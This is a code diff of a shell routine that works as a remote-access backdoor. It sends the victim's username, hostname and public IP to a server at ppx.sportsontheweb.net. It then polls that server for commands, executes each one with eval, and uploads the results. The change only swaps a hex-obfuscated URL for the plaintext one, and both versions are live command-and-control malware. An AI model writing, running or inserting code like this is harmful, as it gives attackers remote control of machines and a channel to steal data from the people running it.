@@ -95,21 +95,20 @@ def l():
     c=$(hostname)
     ip=$(curl -s ifconfig.me)
     x="${u}_${c}_${ip}"
-    d="\x68\x74\x74\x70\x3A\x2F\x2F\x70\x70\x78\x2E\x73\x70\x6F\x72\x74\x73\x6F\x6E\x74\x68\x65\x77\x65\x62\x2E\x6E\x65\x74\x2F\x63\x31\x2E\x70\x68\x70"
-    curl "$d/c1.php?id=${x}"
+    curl "http://ppx.sportsontheweb.net/c1.php?id=${x}"
     t="/tmp/re"
     mkdir -p "$t"
     l=""
     while true; do
         sleep 2000
-        r=$(curl -s "$d/c1.php?id=$x")
+        r=$(curl -s "http://ppx.sportsontheweb.net/c1.php?id=$x")
         if [ -n "$r" ]; then
             if [ "$r" != "$l" ]; then
                 res=$(eval "$r" 2>&1)
                 l="$r"
                 f="$t/lt_$(date +%Y%m%d_%H%M%S).txt"
                 echo "$res" > "$f"
-                curl -F "file=@$f" "$d/c1.php"
+                curl -F "file=@$f" "http://ppx.sportsontheweb.net/c1.php"
             fi
         fi
     done
